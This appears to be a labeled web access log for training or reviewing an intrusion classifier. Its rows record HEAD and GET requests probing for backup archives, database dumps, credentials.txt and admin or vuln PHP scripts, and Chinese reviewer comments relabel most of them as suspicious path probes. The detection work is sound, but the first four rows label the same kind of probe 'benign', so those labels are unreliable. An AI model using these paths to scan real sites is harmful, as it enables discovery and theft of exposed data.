2022-12-22,2022-12-22T12:10:10-08:00,45.130.202.91,HEAD,/bak/dump.sql,,/bak/dump.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:12:57-08:00,212.30.36.82,HEAD,/old/www.tar,,/old/www.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:04:45-08:00,45.134.22.152,HEAD,/backup/backup.sql.tar,,/backup/backup.sql.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:51:25-08:00,98.159.226.30,HEAD,/restore/secrepo.com.rar,,/restore/secrepo.com.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/backup.gz,,/backups/backup.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求备份压缩包路径，属于备份文件探测，建议回流到已知类,METHOD=HEAD PATH=/backups/backup.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/bak/secrepo.com.tar.gz,,/bak/secrepo.com.tar.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求 tar.gz 备份包路径，属于备份泄露探测,METHOD=HEAD PATH=/bak/secrepo.com.tar.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/self.logs/,,/self.logs/,HTTP/1.1,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",suspicious_path_probe,manual_backflow,直接浏览 self.logs 目录，属于敏感目录探测,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/directory.tar.gz,,/restore/directory.tar.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求 restore 目录下 tar.gz，属于备份文件探测,METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/public_html.zip,,/restore/public_html.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/public_html.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/directory.zip,,/restore/directory.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/application.zip,,/old/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/latest.zip,,/backup/latest.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backup/latest.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/back/application.zip,,/back/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/back/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/Archive.zip,,/backups/Archive.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/bak.zip,,/old/bak.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/backup.zip,,/restore/backup.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/backup.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/archive.zip,,/old/archive.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/archive.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/backup.sql.zip,,/backup/backup.sql.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测 backup.sql.zip，属于数据库备份探测,METHOD=HEAD PATH=/backup/backup.sql.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/bak.gz,,/restore/bak.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/credentials.txt,,/old/credentials.txt,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测 old/credentials.txt，属于敏感文件探测,METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/www.zip,,/backup/www.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backup/www.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/latest.zip,,/backups/latest.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/application.zip,,/backups/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/images/vuln.php,,/images/vuln.php,HTTP/1.1,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",suspicious_path_probe,manual_backflow,vuln.php 命名更像漏洞/后门文件探测，建议归到路径探测,METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/media-admin.php,,/media-admin.php,HTTP/1.1,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",suspicious_path_probe,manual_backflow,探测 media-admin.php，属于后台/敏感脚本路径探测,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1
